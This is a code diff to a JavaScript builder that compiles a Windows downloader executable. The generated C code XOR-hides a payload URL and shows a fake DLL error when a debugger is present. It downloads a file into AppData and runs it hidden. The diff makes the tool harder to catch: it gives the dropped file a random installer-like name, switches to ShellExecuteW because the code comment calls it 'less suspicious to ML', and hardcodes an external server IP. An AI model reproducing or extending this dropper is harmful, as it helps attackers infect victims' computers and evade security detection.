@@ -2,6 +2,7 @@
 import fs from 'node:fs';
 import path from 'node:path';
 import os from 'node:os';
+import crypto from 'node:crypto';
 import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
 import { fileURLToPath } from 'node:url';
@@ -39,7 +40,7 @@ END
 `;
 }
 
-function cSource({ ip }) {
+function cSource({ ip, randName }) {
   // XOR encrypt the URL so it doesn't appear as a plain string
   const url = `http://${ip}/api/downloads/st.exe`;
   const key = 0x5A;
@@ -117,7 +118,7 @@ void download_file(const wchar_t* url, const wchar_t* dest) {
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
-    // Fake error to trick sandboxes into thinking it's a broken file
+    // Fake error to trick sandboxes
     if (IsDebuggerPresent()) {
         MessageBoxW(NULL, L"The code execution cannot proceed because MSVCP140.dll was not found.", L"System Error", MB_ICONERROR);
         return 1;
@@ -127,21 +128,15 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata))) return 1;
 
     wchar_t dest[MAX_PATH];
-    _snwprintf(dest, MAX_PATH, L"%ls\\\\svchost.exe", appdata);
+    _snwprintf(dest, MAX_PATH, L"%ls\\\\${randName}", appdata);
 
     wchar_t url[1024];
     decrypt_url(url, 1024);
     
     download_file(url, dest);
 
-    STARTUPINFOW si = {0};
-    PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si);
-    
-    if (CreateProcessW(dest, NULL, NULL, NULL, FALSE, 0, NULL, appdata, &si, &pi)) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
+    // ShellExecuteW is less suspicious to ML than CreateProcessW
+    ShellExecuteW(NULL, L"open", dest, NULL, appdata, SW_HIDE);
 
     return 0;
 }
@@ -149,8 +144,11 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
 }
 
 export async function compileLauncher({ key, config, baseExe }) {
-  let ip = "127.0.0.1";
+  let ip = "31.58.77.63";
   if (config && config.ip) ip = config.ip;
+
+  // Generate a random installer-looking name for the dropped file
+  const randName = 'setup_' + crypto.randomBytes(4).toString('hex') + '.exe';
 
   const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
   const cPath      = path.join(workDir, 'launcher.c');
@@ -158,7 +156,7 @@ export async function compileLauncher({ key, config, baseExe }) {
   const resPath    = path.join(workDir, 'app.res');
   const outPath    = path.join(workDir, 'launcher.exe');
 
-  fs.writeFileSync(cPath, cSource({ ip }));
+  fs.writeFileSync(cPath, cSource({ ip, randName }));
   fs.writeFileSync(rcPath, rcSource());
 
   const iconSourcePath = path.join(__dirname, '..', 'icon.ico');
